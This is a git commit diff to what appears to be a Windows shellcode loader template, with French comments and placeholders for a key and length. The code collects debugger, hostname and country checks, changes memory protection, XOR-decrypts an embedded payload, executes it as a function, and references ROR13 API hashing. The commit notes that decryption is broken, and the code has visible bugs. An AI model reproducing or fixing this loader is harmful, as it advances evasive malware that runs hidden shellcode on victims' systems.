96c7ee0f52af4721ac12cad35e82f20b1039192d
Couscouz <rem.couzi@gmail.com>
2025-02-17 22:22:49 +0100

    decryption not working. VirtualAlloc might be no bueno

--- src/loader.c
+++ src/loader.c
@@ -10,13 +10,29 @@ void main() {
     char *hostname = h();
     char *country = c();
 
-    char k[10] = "%KEY%";
+    char k[] = "%KEY%";
+    size_t k_len = strlen(k);
     short l =  %LENGTH%;
     
     printf("is_debugged: %d\n", is_debugged);
     printf("hostname: %s\n", hostname);
     printf("size: %d\n", size);
     printf("country: %s\n", country);
+
+
+    size_t ss = sizeof(msgbox_payload);
+    // Manipuler la mémoire via VirtualProtect
+    DWORD oldProtect;
+    if (!VirtualProtect(msgbox_payload, ss, PAGE_READWRITE, &oldProtect)) {
+        printf("Erreur lors de VirtualProtect: %lu\n", GetLastError());
+        return;
+    }
+
+    // XORer le contenu de msgbox
+    for (size_t i = 0; i < ss; ++i) {
+        msgbox_payload[i] ^= k[i % k_len];  // XOR avec 0xFF
+    }
+
 
     ((void (*)())msgbox_payload)();
 }
@@ -25,3 +41,4 @@ void main() {
 https://asecuritysite.com/hash/ror13
 
 */
+
